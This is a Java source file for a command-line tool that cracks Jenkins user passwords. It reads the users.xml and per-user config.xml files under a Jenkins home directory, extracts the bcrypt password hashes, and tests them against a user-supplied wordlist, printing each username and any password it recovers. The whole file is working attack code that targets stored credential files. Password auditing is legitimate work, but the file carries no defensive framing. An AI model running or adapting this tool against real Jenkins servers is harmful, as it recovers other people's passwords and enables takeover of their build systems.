package com.cat.bc;


import org.mindrot.jbcrypt.BCrypt;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;


public class BcryptCrack {


    public static void main(String[] args) {


        Scanner u = new Scanner(System.in);
        System.out.print("请提供 JENKINS_HOME/users 目录：");
        String Users_Path = u.nextLine();

        Scanner p = new Scanner(System.in);
        System.out.print("请提供您的字典：");
        String Pass_Path = p.nextLine();

        List<String> pass = readTxt(Pass_Path);

        Map<String, String> usermap = getUserMap(Users_Path);

        for (String key : usermap.keySet()) {
            try {
                String passwordHash=getUserHashed(Users_Path,usermap.get(key));
                getPass(key,passwordHash,pass);
            } catch (Exception e) {
//                e.printStackTrace();
            }

        }

    }

    public static String getUserHashed(String Users_Path,String userConfigName) {
        String xml = null;
        try {
            xml = GetXML.LoadContentByPath(Users_Path+"\\"+userConfigName+"\\config.xml");
        } catch (IOException e) {
//            e.printStackTrace();
        }
        List<String>  passwordHash =GetXML.getFieldListByRegex(xml,"passwordHash");
        return (passwordHash.get(0).replace("#jbcrypt:",""));

    }


    public static Map<String, String> getUserMap(String Users_Path){
        String xml = null;
        try {
            xml = GetXML.LoadContentByPath(Users_Path+"\\users.xml");
        } catch (IOException e) {
            e.printStackTrace();
        }
        List<String>  user_hashed =GetXML.getFieldListByRegex(xml,"string");
        Map<String, String> m = new HashMap<>();

        for(int i=0;i<user_hashed.size();i++)    {
            if(i%2==0)
                m.put(user_hashed.get(i),user_hashed.get(i+1));
        }

        return m;
    }

    public static void getPass(String user,String hashed, List<String> pass) {
        assert pass != null;
        for (Object o : pass) {
            if (BCrypt.checkpw((String) o, hashed)) {
                System.out.println(user+"：" + o);
                break;
            }
        }
    }


    public static List<String> readTxt(String filePath) {
        List<String> fileList = new ArrayList<>();
        try {
            fileList = Files.readAllLines(Paths.get(filePath));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return fileList;
    }


}


